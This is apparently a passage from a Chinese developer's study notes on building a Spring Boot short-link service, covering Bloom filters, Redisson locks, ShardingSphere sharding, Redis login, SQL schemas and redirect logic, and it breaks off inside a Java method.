<p><a href="https://segmentfault.com/q/1010000019538722">java - springboot中,不存在的url会不会被Interceptor拦截? - SegmentFault 思否</a></p>
<p>对应commit：<a href="https://gitee.com/xiong-changchun/shortlink/commit/77b9d3d8b07fee130f914f49ecdebd671a85c5af">feature:用户敏感信息接口返回脱敏 · 77b9d3d · changchun&#x2F;shortlink - Gitee.com</a></p>
<p>如果需要返回精确的信息增加actual接口和对应的actual实体类就好：</p>
<p>对应commit：<a href="https://gitee.com/xiong-changchun/shortlink/commit/e2fed0887961db87bddaf40bc96c2b7c0e126648">feature:返回具体信息接口编写 · e2fed08 · changchun&#x2F;shortlink - Gitee.com</a></p>
<h3 id="检查用户名是否存在"><a href="#检查用户名是否存在" class="headerlink" title="检查用户名是否存在"></a>检查用户名是否存在</h3><p>用户注册的时候输入用户名可以看用户是否已经被用</p>
<p>对应commit：<a href="https://gitee.com/xiong-changchun/shortlink/commit/f51640d9269e766ee073bb178e23c3c6c5f5f95e">feature:检查用户是否存在实现 · f51640d · changchun&#x2F;shortlink - Gitee.com</a></p>
<h3 id="防止检查用户名缓存穿透"><a href="#防止检查用户名缓存穿透" class="headerlink" title="防止检查用户名缓存穿透"></a>防止检查用户名缓存穿透</h3><ol>
<li><p>用户名加载缓存</p>
<p>该方案问题：</p>
<ul>
<li>是否要设置数据的有效期？只能设置为无无有效期，也就是永久数据。</li>
<li>如果是永久不过期数据，占用 Redis 内存太高。</li>
</ul>
</li>
<li><p>布隆过滤器</p>
</li>
</ol>
<p>布隆过滤器是一种数据结构，用于快速判断一个元素是否存在于一个集合中。具体来说，布隆过滤器包含一个位数组和一组哈希函数。位数组的初始值全部置为 0。在插入一个元素时，将该元素经过多个哈希函数映射到位数组上的多个位置，并将这些位置的值置为 1。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">优点：</span><br><span class="line">● 高效地判断一个元素是否属于一个大规模集合。</span><br><span class="line">● 节省内存。</span><br><span class="line">缺点：</span><br><span class="line">● 可能存在一定的误判。 （不存在一定不存在，存在不一定存在）</span><br><span class="line"></span><br><span class="line">● 布隆过滤器要设置初始容量。容量设置越大，冲突几率越低。</span><br><span class="line">● 布隆过滤器会设置预期的误判值。</span><br><span class="line"></span><br><span class="line">布隆过滤器的误判是否能够接受？</span><br><span class="line">答：可以容忍。为什么？因为用户名不是特别重要的数据，如果说我设置用户名为 aaa，系统返回我不可用，那我大可以在 aaa 的基础上再加一个a，也就是 aaaa。</span><br></pre></td></tr></table></figure>

<p>使用布隆过滤器的两种场景：</p>
<ul>
<li>初始使用：注册用户时就向容器中新增数据，就不需要任务向容器存储数据了。</li>
<li>使用过程中引入：读取数据源将目标数据刷到布隆过滤器。</li>
</ul>
<p>布隆过滤器预估网站：<a href="https://krisives.github.io/bloom-calculator/">Bloom Filter Calculator (krisives.github.io)</a></p>
<p><a href="https://cloud.tencent.com/developer/article/2331120">SpringBoot 如何集成 Redis 实现布隆过滤器-腾讯云开发者社区-腾讯云 (tencent.com)</a></p>
<p>redis账号</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">192.168.101.65:6379</span><br><span class="line">docker exec -it redis redis-cli</span><br><span class="line">密码redis</span><br></pre></td></tr></table></figure>

<p>对应commit：<a href="https://gitee.com/xiong-changchun/shortlink/commit/b2654b88b9203b7e2088b6769eeb39c8c8183891">feature:使用布隆过滤器检查用户是否存在 · b2654b8 · changchun&#x2F;shortlink - Gitee.com</a></p>
<h3 id="实现海量请求注册功能"><a href="#实现海量请求注册功能" class="headerlink" title="实现海量请求注册功能"></a>实现海量请求注册功能</h3><p>1.如何防止用户名重复？</p>
<p>通过布隆过滤器把所有用户名进行加载。这样该功能就能完全隔离数据库。</p>
<p>数据库层面添加唯一索引。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">t_user	0	PRIMARY	1	id	A	0				BTREE			YES	</span><br><span class="line">t_user	0	idx_unique_username	1	username	A	2			YES	BTREE		用户名唯一	YES	</span><br></pre></td></tr></table></figure>



<p>2.如何防止恶意请求毫秒级触发大量请求去一个未注册的用户名？</p>
<p>因为用户名没注册，所以布隆过滤器不存在，代表着可以触发注册流程插入数据库。但是如果恶意请求短时间海量请求，这些请求都会落到数据库，造成数据库访问压力。这里通过分布式锁，锁定用户名进行串行执行，防止恶意请求利用未注册用户名将请求打到数据库。</p>
<p><a href="https://cloud.tencent.com/developer/article/2361352">Redission：可重入锁（Reentrant Lock）-腾讯云开发者社区-腾讯云 (tencent.com)</a></p>
<p><a href="https://cloud.tencent.com/developer/article/2127060">redisson锁 tryLock的使用及正确用法-腾讯云开发者社区-腾讯云 (tencent.com)</a></p>
<p>3.如果恶意请求全部使用未注册用户名发起注册</p>
<p>结论：系统无法进行完全风控，只有通过类似于限流的功能进行保障系统安全。</p>
<p>对应commit：<a href="https://gitee.com/xiong-changchun/shortlink/commit/fd6227bc1adac9eaf5139e749eb8533bc76cef6f">feature:实现海量请求注册功能 · fd6227b · changchun&#x2F;shortlink - Gitee.com</a></p>
<h3 id="海量用户如何分库分表"><a href="#海量用户如何分库分表" class="headerlink" title="海量用户如何分库分表"></a>海量用户如何分库分表</h3><p>为什么要分库分表？</p>
<ul>
<li>数据量庞大。</li>
<li>查询性能缓慢，之前可能是 20ms，后续随着数据量的增长，查询时间呈指数增长。</li>
<li>数据库连接不够。</li>
</ul>
<p><em><strong>数据库分库分表框架 ShardingSphere</strong></em></p>
<p>Sharding-JDBC。<a href="https://shardingsphere.apache.org/document/current/cn/dev-manual/sharding/">数据分片 :: ShardingSphere (apache.org)</a></p>
<p>使用后的对应日志：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">2024-10-16T15:28:17.326+08:00  INFO 17172 --- [nio-8002-exec-1] ShardingSphere-SQL                       : Logic SQL: INSERT INTO t_user  ( id,</span><br><span class="line">username,</span><br><span class="line">password,</span><br><span class="line">real_name,</span><br><span class="line">phone,</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">create_time,</span><br><span class="line">update_time,</span><br><span class="line">del_flag )  VALUES  ( ?,</span><br><span class="line">?,</span><br><span class="line">?,</span><br><span class="line">?,</span><br><span class="line">?,</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">?,</span><br><span class="line">?,</span><br><span class="line">? )</span><br><span class="line">2024-10-16T15:28:17.326+08:00  INFO 17172 --- [nio-8002-exec-1] ShardingSphere-SQL                       : Actual SQL: ds_0 ::: INSERT INTO t_user_8  ( id,</span><br><span class="line">username,</span><br><span class="line">password,</span><br><span class="line">real_name,</span><br><span class="line">phone,</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">create_time,</span><br><span class="line">update_time,</span><br><span class="line">del_flag )  VALUES  (?, ?, ?, ?, ?, ?, ?, ?) ::: [1846453089775738882, xcc, 123456, 熊长春, 12345678123, 2024-10-16 15:28:16.701, 2024-10-16 15:28:16.701, 0]</span><br><span class="line"></span><br></pre></td></tr></table></figure>





<p><em><strong>分片键</strong></em></p>
<p>用于将数据库（表）水平拆分的数据库字段。 </p>
<p>分库分表中的分片键（Sharding Key）是一个关键决策，它直接影响了分库分表的性能和可扩展性。以下是一些选择分片键的关键因素：</p>
<ol>
<li>访问频率：选择分片键应考虑数据的访问频率。将经常访问的数据放在同一个分片上，可以提高查询性能和降低跨分片查询的开销。</li>
<li>数据均匀性：分片键应该保证数据的均匀分布在各个分片上，避免出现热点数据集中在某个分片上的情况。</li>
<li>数据不可变：一旦选择了分片键，它应该是不可变的，不能随着业务的变化而频繁修改。</li>
</ol>
<p>用户名和用户ID选哪个作为分片键？</p>
<ul>
<li>用户名。用户名可以登录。</li>
</ul>
<p>对应commit：<a href="https://gitee.com/xiong-changchun/shortlink/commit/119d891a6c1a4810faa2e64eb37810794e01b538">分库分表实现 · 119d891 · changchun&#x2F;shortlink - Gitee.com</a></p>
<h3 id="用户敏感信息实现加密存储"><a href="#用户敏感信息实现加密存储" class="headerlink" title="用户敏感信息实现加密存储"></a>用户敏感信息实现加密存储</h3><p><a href="https://gitee.com/xiong-changchun/shortlink/commit/28e2bde90c34f068a49d5cdf702c64cc9e4af3ec">feature:用户敏感信息实现加密存储 · 28e2bde · changchun&#x2F;shortlink - Gitee.com</a></p>
<p>使用shardingSphere来实现的</p>
<h3 id="用户信息修改实现"><a href="#用户信息修改实现" class="headerlink" title="用户信息修改实现"></a>用户信息修改实现</h3><p>不同的实体对象尽量不要复用</p>
<p>对应commit：</p>
<h3 id="用户登录实现"><a href="#用户登录实现" class="headerlink" title="用户登录实现"></a>用户登录实现</h3><p><a href="https://www.hutool.cn/docs/#/">入门和安装 (hutool.cn)</a> hutool是真好用啊</p>
<p><a href="https://developer.baidu.com/article/details/3215815">RedisTemplate与Redisson：Redis的Java操作工具比较-百度开发者中心 (baidu.com)</a></p>
<p><a href="https://blog.csdn.net/as4589sd/article/details/114587393">详细比较StringRedisTemplate和RedisTemplate的区别及使用方法，及解决融合使用方法-CSDN博客</a></p>
<p>用户登录先判断账号密码是否正确（其实感觉可以加一步，使用布隆过滤器判断不存在肯定不存在），然后判断redis用户是否已经登录（可以更新在redis中的时间），如果没有登录登录最后在存入redis</p>
<p>对应commit：</p>
<p><a href="https://gitee.com/xiong-changchun/shortlink/commit/44d22dbca081e70863d6a15e0702a0168f642a4f">feature:用户登录功能实现 · 44d22db · changchun&#x2F;shortlink - Gitee.com</a></p>
<p><a href="https://gitee.com/xiong-changchun/shortlink/commit/a2ab412398514c31e6c2d89c310e6202cf8f3ab2">feature:用户登录功能实现 · a2ab412 · changchun&#x2F;shortlink - Gitee.com</a></p>
<p><a href="https://blog.csdn.net/xishining/article/details/115152823">Git：Rebase和Merge之间的区别，看完这篇文章你就懂了！-CSDN博客</a></p>
<p><a href="https://cloud.tencent.com/developer/article/1690638">Git 合并多个 commit，保持历史简洁-腾讯云开发者社区-腾讯云 (tencent.com)</a></p>
<p><a href="https://zhuanlan.zhihu.com/p/342114817">【git】如何利用 rebase 合并多次 commit - 知乎 (zhihu.com)</a></p>
<h3 id="用户退出功能实现"><a href="#用户退出功能实现" class="headerlink" title="用户退出功能实现"></a>用户退出功能实现</h3><p>直接从redis删除即可</p>
<p>对应commit：<a href="https://gitee.com/xiong-changchun/shortlink/commit/5fd4b0ed985cf96814d3c37eba9e6db5cbdf0f6d">feature:用户退出功能实现 · 5fd4b0e · changchun&#x2F;shortlink - Gitee.com</a></p>
<h2 id="短链接分组"><a href="#短链接分组" class="headerlink" title="短链接分组"></a>短链接分组</h2><h3 id="功能分析-1"><a href="#功能分析-1" class="headerlink" title="功能分析"></a>功能分析</h3><ul>
<li>增加短链接分组</li>
<li>修改短链接分组（只能修改名称）</li>
<li>查询短链接分组集合（短链接分组最多10个）</li>
<li>删除短链接分组</li>
<li>短链接分组排序</li>
</ul>
<h3 id="创建短链接分组数据表"><a href="#创建短链接分组数据表" class="headerlink" title="创建短链接分组数据表"></a>创建短链接分组数据表</h3><p>数据表创建语句</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> `t_group` (</span><br><span class="line">  `id` <span class="type">bigint</span>(<span class="number">20</span>) <span class="keyword">NOT</span> <span class="keyword">NULL</span> AUTO_INCREMENT COMMENT <span class="string">&#x27;ID&#x27;</span>,</span><br><span class="line">  `gid` <span class="type">varchar</span>(<span class="number">32</span>) <span class="keyword">DEFAULT</span> <span class="keyword">NULL</span> COMMENT <span class="string">&#x27;分组标识&#x27;</span>,</span><br><span class="line">  `name` <span class="type">varchar</span>(<span class="number">64</span>) <span class="keyword">DEFAULT</span> <span class="keyword">NULL</span> COMMENT <span class="string">&#x27;分组名称&#x27;</span>,</span><br><span class="line">  `username` <span class="type">varchar</span>(<span class="number">256</span>) <span class="keyword">DEFAULT</span> <span class="keyword">NULL</span> COMMENT <span class="string">&#x27;创建分组用户名&#x27;</span>,</span><br><span class="line">  `sort_order` <span class="type">int</span>(<span class="number">3</span>) <span class="keyword">DEFAULT</span> <span class="keyword">NULL</span> COMMENT <span class="string">&#x27;分组排序&#x27;</span>,</span><br><span class="line">  `create_time` datetime <span class="keyword">DEFAULT</span> <span class="keyword">NULL</span> COMMENT <span class="string">&#x27;创建时间&#x27;</span>,</span><br><span class="line">  `update_time` datetime <span class="keyword">DEFAULT</span> <span class="keyword">NULL</span> COMMENT <span class="string">&#x27;修改时间&#x27;</span>,</span><br><span class="line">  `del_flag` tinyint(<span class="number">1</span>) <span class="keyword">DEFAULT</span> <span class="keyword">NULL</span> COMMENT <span class="string">&#x27;删除标识 0：未删除 1：已删除&#x27;</span>,</span><br><span class="line">  <span class="keyword">PRIMARY</span> KEY (`id`),</span><br><span class="line">  <span class="keyword">UNIQUE</span> KEY `idx_unique_gid_username` (`gid`,`username`) <span class="keyword">USING</span> BTREE</span><br><span class="line">) ENGINE<span class="operator">=</span>InnoDB <span class="keyword">DEFAULT</span> CHARSET<span class="operator">=</span>utf8mb4;;</span><br></pre></td></tr></table></figure>

<p>gid和用户名唯一索引</p>
<h3 id="新增短链接分组功能"><a href="#新增短链接分组功能" class="headerlink" title="新增短链接分组功能"></a>新增短链接分组功能</h3><p><a href="https://gitee.com/xiong-changchun/shortlink/commit/709fb19f03487d26eae90af30557b8b79c1ddd29">optimize:优化用户属性持久层基础属性 · 709fb19 · changchun&#x2F;shortlink - Gitee.com</a></p>
<p><a href="https://gitee.com/xiong-changchun/shortlink/commit/68cfad8d07ba3ef4bd1ab6cd42abaf2bd762c66f">feature:开发短链接分组新增功能 · 68cfad8 · changchun&#x2F;shortlink - Gitee.com</a></p>
<p><a href="https://gitee.com/xiong-changchun/shortlink/commit/1ccf7222253e027e1e272926e86fead6a1ccd788">feature:开发数据库持久层对象基本属性 · 1ccf722 · changchun&#x2F;shortlink - Gitee.com</a></p>
<h3 id="查询短链接分组功能"><a href="#查询短链接分组功能" class="headerlink" title="查询短链接分组功能"></a>查询短链接分组功能</h3><p><a href="https://gitee.com/xiong-changchun/shortlink/commit/0cfbcaba382039101fbd6971909296457589765b">feature:开发查询短链接分组接口 · 0cfbcab · changchun&#x2F;shortlink - Gitee.com</a></p>
<p><a href="https://gitee.com/xiong-changchun/shortlink/commit/5c65e6f40b392603d209c3a87abc3924cad44cfa">optimize:开发短链接分组排序字段 · 5c65e6f · changchun&#x2F;shortlink - Gitee.com</a></p>
<h3 id="封装用户上下文"><a href="#封装用户上下文" class="headerlink" title="封装用户上下文"></a>封装用户上下文</h3><p><a href="https://blog.csdn.net/u011291072/article/details/109692603">一眼看清@JSONField注解使用与效果-CSDN博客</a></p>
<p><a href="https://blog.csdn.net/m0_51681531/article/details/130424028">阿里开源的TransmittableThreadLocal的正确使用姿势_com.alibaba.ttl.transmittablethreadlocal-CSDN博客</a></p>
<p>对应commit：<a href="https://gitee.com/xiong-changchun/shortlink/commit/c73e3c497e5aebb96a46989f552c93c54bd1c20f">feature:封装用户上下文 · c73e3c4 · changchun&#x2F;shortlink - Gitee.com</a></p>
<h3 id="修改短链接分组"><a href="#修改短链接分组" class="headerlink" title="修改短链接分组"></a>修改短链接分组</h3><p>对应commit：<a href="https://gitee.com/xiong-changchun/shortlink/commit/1971bf633e92ee094b4b722e98b2e3a16549f776">feature:修改短链接分组 · 1971bf6 · changchun&#x2F;shortlink - Gitee.com</a></p>
<h3 id="删除短链接分组"><a href="#删除短链接分组" class="headerlink" title="删除短链接分组"></a>删除短链接分组</h3><p>对应commit：<a href="https://gitee.com/xiong-changchun/shortlink/commit/9fbdcafb638b75eeeedb123a7b5af2d49c8ccf44">feature:删除短链接分组 · 9fbdcaf · changchun&#x2F;shortlink - Gitee.com</a></p>
<h3 id="短链接分组排序功能"><a href="#短链接分组排序功能" class="headerlink" title="短链接分组排序功能"></a>短链接分组排序功能</h3><p>对应commit：<a href="https://gitee.com/xiong-changchun/shortlink/commit/a2fd2b85707e92e498cb61d5301ac4261461d9f1">feature:短链接分组排序功能实现 · a2fd2b8 · changchun&#x2F;shortlink - Gitee.com</a></p>
<h2 id="短链接管理"><a href="#短链接管理" class="headerlink" title="短链接管理"></a>短链接管理</h2><h3 id="短链接跳转原理"><a href="#短链接跳转原理" class="headerlink" title="短链接跳转原理"></a>短链接跳转原理</h3><p><img src="https://cdn.jsdelivr.net/gh/realikun404/img_bed2@master/imgimage-20241017105103769.png" alt="image-20241017105103769"></p>
<p>一般以 3xx 开头的代表重定向，表示网页发生了转移，需要重定向到对应的地址中去，两者区别是：</p>
<ul>
<li>301：表示永久性转移（Permanently Moved）</li>
<li>302：表示临时性转移（Temporarily Moved）</li>
</ul>
<p>网上一个相似短链接网站：<a href="https://www.c1n.cn/administrators.html">C1N短网址服务-控制台</a></p>
<p><strong>对应数据表</strong></p>
<p>设置域名下唯一（创建索引）</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> `t_link` (</span><br><span class="line">  `id` <span class="type">bigint</span> <span class="keyword">NOT</span> <span class="keyword">NULL</span> COMMENT <span class="string">&#x27;ID&#x27;</span>,</span><br><span class="line">  `domain` <span class="type">varchar</span>(<span class="number">128</span>) <span class="type">CHARACTER</span> <span class="keyword">SET</span> utf8mb4 <span class="keyword">COLLATE</span> utf8mb4_bin <span class="keyword">DEFAULT</span> <span class="keyword">NULL</span>,</span><br><span class="line">  `short_uri` <span class="type">varchar</span>(<span class="number">8</span>) <span class="keyword">COLLATE</span> utf8mb4_bin <span class="keyword">DEFAULT</span> <span class="keyword">NULL</span>,</span><br><span class="line">  `full_short_url` <span class="type">varchar</span>(<span class="number">128</span>) <span class="keyword">COLLATE</span> utf8mb4_bin <span class="keyword">DEFAULT</span> <span class="keyword">NULL</span>,</span><br><span class="line">  `origin_url` <span class="type">varchar</span>(<span class="number">1024</span>) <span class="keyword">COLLATE</span> utf8mb4_bin <span class="keyword">DEFAULT</span> <span class="keyword">NULL</span>,</span><br><span class="line">  `click_num` <span class="type">int</span> <span class="keyword">DEFAULT</span> <span class="string">&#x27;0&#x27;</span> COMMENT <span class="string">&#x27;点击次数&#x27;</span>,</span><br><span class="line">  `gid` <span class="type">varchar</span>(<span class="number">32</span>) <span class="type">CHARACTER</span> <span class="keyword">SET</span> utf8mb4 <span class="keyword">COLLATE</span> utf8mb4_bin <span class="keyword">DEFAULT</span> <span class="string">&#x27;default&#x27;</span> COMMENT <span class="string">&#x27;分组标识&#x27;</span>,</span><br><span class="line">  `enable_status` tinyint(<span class="number">1</span>) <span class="keyword">DEFAULT</span> <span class="string">&#x27;0&#x27;</span> COMMENT <span class="string">&#x27;0 启用，1 未启用&#x27;</span>,</span><br><span class="line">  `created_type` tinyint(<span class="number">1</span>) <span class="keyword">DEFAULT</span> <span class="keyword">NULL</span> COMMENT <span class="string">&#x27;0 接口创建，1控制台创建&#x27;</span>,</span><br><span class="line">  `valid_date_type` tinyint(<span class="number">1</span>) <span class="keyword">DEFAULT</span> <span class="keyword">NULL</span> COMMENT <span class="string">&#x27;0 永久有效，1 自定义&#x27;</span>,</span><br><span class="line">  `valid_date` datetime <span class="keyword">DEFAULT</span> <span class="keyword">NULL</span> COMMENT <span class="string">&#x27;有效期&#x27;</span>,</span><br><span class="line">  `<span class="keyword">describe</span>` <span class="type">varchar</span>(<span class="number">1024</span>) <span class="keyword">COLLATE</span> utf8mb4_bin <span class="keyword">DEFAULT</span> <span class="keyword">NULL</span> COMMENT <span class="string">&#x27;描述&#x27;</span>,</span><br><span class="line">  `create_time` datetime <span class="keyword">DEFAULT</span> <span class="keyword">NULL</span>,</span><br><span class="line">  `update_time` datetime <span class="keyword">DEFAULT</span> <span class="keyword">NULL</span>,</span><br><span class="line">  `del_flag` tinyint(<span class="number">1</span>) <span class="keyword">DEFAULT</span> <span class="string">&#x27;0&#x27;</span> COMMENT <span class="string">&#x27;0 未删除 ， 1 已被删除&#x27;</span>,</span><br><span class="line">  <span class="keyword">PRIMARY</span> KEY (`id`),</span><br><span class="line">  <span class="keyword">UNIQUE</span> KEY `idx_unique_full_short_url` (`full_short_url`) <span class="keyword">USING</span> BTREE</span><br><span class="line">) ENGINE<span class="operator">=</span>InnoDB <span class="keyword">DEFAULT</span> CHARSET<span class="operator">=</span>utf8mb4 <span class="keyword">COLLATE</span><span class="operator">=</span>utf8mb4_bin</span><br></pre></td></tr></table></figure>

<p><strong>短链接生成算法</strong></p>
<p>假设我们使用的是 26 个字母的大小写，加上 10 个数字，那么对于短链接可以表示的最大组合数量为：</p>
<ul>
<li>N &#x3D; 4，组合数为 62 ^ 4 &#x3D; 14_776_336，1477 万左右</li>
<li>N &#x3D; 5，组合数为 62 ^ 5 &#x3D; 916_132_832，9.16 亿左右</li>
<li>N &#x3D; 6，组合数为 62 ^ 6 &#x3D; 56_800_235_584，568 亿左右</li>
</ul>
<p>生成短链接的时候，只需要生成一个唯一的 10 进制数，然后再基于此 10 进制数转换为 62 进制数即可。</p>
<h3 id="新增短链接"><a href="#新增短链接" class="headerlink" title="新增短链接"></a>新增短链接</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">在MySQL中，校对规则（Collation）是一种用于比较和排序字符集的算法，用于确定字符串的排序顺序以及在执行各种字符串比较时如何比较字符串的规则。_ci是校对规则的一个后缀，表示在比较字符串时要忽略大小写。</span><br><span class="line"></span><br><span class="line">在utf8mb4_unicode_ci校对规则中，_ci表示它是大小写不敏感的。底层原理是它使用了Unicode Collation Algorithm（UCA）来进行排序和比较，该算法将字符映射到Unicode标准中的对应位置，并对字符进行比较，然后根据字符的权重排序。对于_ci后缀，UCA将使用一种称为基本级别的比较方法，其中字母大小写被视为相等，因此会忽略大小写进行比较。</span><br></pre></td></tr></table></figure>



<p>短链接不可重复（索引保证）、修改short_uri的编码为utf8（utf8-bin）</p>
<p><a href="https://blog.csdn.net/weixin_49114503/article/details/129181584">Springboot依赖注入Bean的三种方式，final+构造器注入Bean_field注入+-CSDN博客</a></p>
<p><a href="https://blog.csdn.net/qq_21908327/article/details/114890294">Mybatis plus 实体类字段有Mysql关键字的处理方法详解_mybatis 关键字处理-CSDN博客</a></p>
<p><a href="https://blog.csdn.net/ZHH1015/article/details/106858359">Mybatis-plus 主键生成策略_mybatisplus设置递增序列主键从0开始、-CSDN博客</a></p>
<p>对应commit：<a href="https://gitee.com/xiong-changchun/shortlink/commit/6129ac12f89524e3d33c6df37fabd076bb6c2729">feature:新增短链接实现 · 6129ac1 · changchun&#x2F;shortlink - Gitee.com</a></p>
<h3 id="短链接分片分表"><a href="#短链接分片分表" class="headerlink" title="短链接分片分表"></a>短链接分片分表</h3><p>对应commit：<a href="https://gitee.com/xiong-changchun/shortlink/commit/538f9b6884c338f6ff5a4e3795923468aa92a13d">feature:短链接分片分表 · 538f9b6 · changchun&#x2F;shortlink - Gitee.com</a></p>
<h3 id="封装admin拦截器封装用户上下文"><a href="#封装admin拦截器封装用户上下文" class="headerlink" title="封装admin拦截器封装用户上下文"></a>封装admin拦截器封装用户上下文</h3><p><a href="https://blog.csdn.net/yu102655/article/details/112490962">spring-boot-maven插件repackage（goal）的那些事_maven repackage-CSDN博客</a></p>
<p><a href="https://blog.csdn.net/wo88798/article/details/82465211">spring boot 拦截器实现拦截前端请求并返回json至前端页面_autologininterceptor notfound-CSDN博客</a></p>
<p>对应commit：<a href="https://gitee.com/xiong-changchun/shortlink/commit/ee03cdd05be88e742d52e9ed6d040bdbf3e904a8">feature:封装admin拦截器封装用户上下文 · ee03cdd · changchun&#x2F;shortlink - Gitee.com</a></p>
<h3 id="短链接分页功能"><a href="#短链接分页功能" class="headerlink" title="短链接分页功能"></a>短链接分页功能</h3><p>数据库新增了favicon字段，表示网站图标</p>
<p>对应commit：<a href="https://gitee.com/xiong-changchun/shortlink/commit/43f5e333472575c64e242a5946b2b0f6d6a7400b">feature:短链接分页功能开发 · 43f5e33 · changchun&#x2F;shortlink - Gitee.com</a></p>
<h3 id="后管联调中台短链接接口"><a href="#后管联调中台短链接接口" class="headerlink" title="后管联调中台短链接接口"></a>后管联调中台短链接接口</h3><p><a href="https://zhuanlan.zhihu.com/p/590383797">面试官问：Java 中如何处理含有泛型的 JSON 反序列化问题？ - 知乎</a><a href="https://blog.csdn.net/code_my_life/article/details/51891520">Java 8 interface default方法_java8 interface default-CSDN博客</a></p>
<p><a href="https://blog.csdn.net/code_my_life/article/details/51891520">Java 8 interface default方法_java8 interface default-CSDN博客</a></p>
<p>commit:<a href="https://gitee.com/xiong-changchun/shortlink/commit/f750f663e041e55fb7c6419b052bca5c551af790">feature:短链接后台系统调用中台链接 · f750f66 · changchun&#x2F;shortlink - Gitee.com</a></p>
<p><a href="https://gitee.com/xiong-changchun/shortlink/commit/f75e20bf16e4cec1b75c83a8a47dc868045a9d57">feature:ShortLinkPageRespDTO新增创建时间以及返回序列化 · f75e20b · changchun&#x2F;shortlink - Gitee.com</a></p>
<h3 id="创建用户后默认添加短链接分组"><a href="#创建用户后默认添加短链接分组" class="headerlink" title="创建用户后默认添加短链接分组"></a>创建用户后默认添加短链接分组</h3><p><a href="https://www.cnblogs.com/java688/p/13594789.html">Mybatis-Plus条件构造器select方法返回指定字段 - java锋哥 - 博客园</a></p>
<p><a href="https://blog.csdn.net/qq_37840993/article/details/116120837">JAVA 中的Optional类理解、学习与使用_java的optional类-CSDN博客</a></p>
<p>对应commit：<a href="https://gitee.com/xiong-changchun/shortlink/commit/4a9b85d518e62f91005dc447c6e81a3fc14c4de5">feature:创建用户后默认添加短链接分组 · 4a9b85d · changchun&#x2F;shortlink - Gitee.com</a></p>
<h3 id="短链接信息修改"><a href="#短链接信息修改" class="headerlink" title="短链接信息修改"></a>短链接信息修改</h3><p>对应commit：<a href="https://gitee.com/xiong-changchun/shortlink/commit/8de94a69b51dc38ae3c3dbb36ad5da8b9eeabecf">feature:修改短链接实现 · 8de94a6 · changchun&#x2F;shortlink - Gitee.com</a></p>
<h3 id="短链接跳转功能实现"><a href="#短链接跳转功能实现" class="headerlink" title="短链接跳转功能实现"></a>短链接跳转功能实现</h3><p><a href="https://blog.csdn.net/m0_71777195/article/details/126226015">啥？分库分表会带来读扩散问题？怎么解决？？？-CSDN博客</a></p>
<p><strong>跳转原理</strong>：通过短链接获取到对应的长链接，对长链接进行 302 重定向，最终访问原始网址。</p>
<p>通过短链接获取到原始连接的过程大致如下，因为原来的逻辑中涉及到缓存穿透，所以进行了一些简化。</p>
<ol>
<li>通过短链接缓存获取对应的原始连接；</li>
<li>如果原始连接缓存失效则需要通过数据库进行查询并再放入缓存；</li>
<li>首先通过短链接查询 <code>t_link_goto</code> 表获取 Gid，再通过 Gid 和短链接查询 <code>t_link</code> 中的原始链接。</li>
</ol>
<p>新增t_link_goto目的：短链接表使用的是 Gid 进行分表，用户通过浏览器访问短链接时，仅有短链接值，没有 Gid 的，所以我们就要建立个路由表，也就是 t_link_goto 进行缓存短链接和 Gid 的关系。短链接是根据分组访问的，那么查询条件中就必须要带一个 Gid。如果我们按照短链接字段进行分表，相当于这个分页查询没有分片键，就会扫描全部分片表，出现<strong>读扩散</strong>问题。</p>
<p>对应数据库创建语句</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> `t_link_goto`(</span><br><span class="line">      `id` <span class="type">bigint</span>(<span class="number">20</span>) <span class="keyword">NOT</span> <span class="keyword">NULL</span> AUTO_INCREMENT COMMENT <span class="string">&#x27;ID&#x27;</span>,</span><br><span class="line">      `gid` <span class="type">varchar</span>(<span class="number">32</span>) <span class="keyword">DEFAULT</span> <span class="string">&#x27;default&#x27;</span> COMMENT  <span class="string">&#x27;分组标识&#x27;</span>,</span><br><span class="line">      `full_short_url` <span class="type">varchar</span>(<span class="number">128</span>) <span class="keyword">DEFAULT</span> <span class="keyword">NULL</span> COMMENT <span class="string">&#x27;完整短链接&#x27;</span>,</span><br><span class="line">      <span class="keyword">PRIMARY</span> KEY (`id`))</span><br><span class="line">      ENGINE<span class="operator">=</span>InnoDB <span class="keyword">DEFAULT</span> CHARSET<span class="operator">=</span>utf8mb4</span><br></pre></td></tr></table></figure>

<p>todo：感觉可以加下索引要快点</p>
<p>本部分关键代码</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">restoreUrl</span><span class="params">(String shortUri, ServletRequest request, ServletResponse response)</span> &#123;</span><br><span class="line">    <span class="type">String</span> <span class="variable">serverName</span> <span class="operator">=</span> request.getServerName();</span><br><span class="line">    <span class="type">String</span> <span class="variable">fullShortUrl</span> <span class="operator">=</span> serverName + <span class="string">&quot;/&quot;</span> + shortUri;</span><br><span class="line">    LambdaQueryWrapper&lt;ShortLinkGotoDO&gt; linkGotoQueryWrapper = Wrappers.lambdaQuery(ShortLinkGotoDO.class)</span><br><span class="line">            .eq(ShortLinkGotoDO::getFullShortUrl, fullShortUrl);</span><br><span class="line">    <span class="type">ShortLinkGotoDO</span> <span class="variable">shortLinkGotoDO</span> <span class="operator">=</span> shortLinkGotoMapper.selectOne(linkGotoQueryWrapper);</span><br><span class="line">    <span class="keyword">if</span> (shortLinkGotoDO == <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="comment">// 严谨来说此处需要进行风控</span></span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    LambdaQueryWrapper&lt;ShortLinkDO&gt; queryWrapper = Wrappers.lambdaQuery(ShortLinkDO.class)</span><br><span class="line">            .eq(ShortLinkDO::getGid, shortLinkGotoDO.getGid())</span><br><span class="line">            .eq(ShortLinkDO::getFullShortUrl, fullShortUrl)</span><br><span class="line">            .eq(ShortLinkDO::getDelFlag, <span 